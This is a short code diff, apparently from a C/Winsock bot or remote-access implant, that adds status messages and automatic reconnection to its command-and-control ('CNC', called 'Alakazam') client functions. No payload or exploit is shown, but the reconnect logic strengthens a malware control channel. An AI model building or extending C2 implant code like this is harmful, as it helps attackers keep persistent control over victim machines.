@@ -49,6 +49,7 @@ void init_cnc_sock() {
 }
 
 void connect_to_cnc() {
+  printf("Connecting to Alakazam.\n");
   struct addrinfo cncinfo = get_cnc_info();
   int res = connect(*cnc, cncinfo.ai_addr, cncinfo.ai_addrlen);
   if (res == SOCKET_ERROR) {
@@ -62,6 +63,8 @@ void connect_to_cnc() {
       WSACleanup();
       exit(1);
     }
+  } else {
+    printf("Connected to Alakazam successfully.\n");
   }
 }
 
@@ -86,6 +89,12 @@ char *recv_from_cnc(int bufsize) {
   if (bytesread == SOCKET_ERROR) {
     printf("Failed receiving from CNC: %d\n", WSAGetLastError());
     exit(1);
+  } else if (bytesread == 0) {
+    printf("Alakazam closed the connection.\n");
+    closesocket(*cnc);
+    init_cnc_sock();
+    connect_to_cnc();
+    return recv_from_cnc(bufsize);
   }
   return buf;
 }
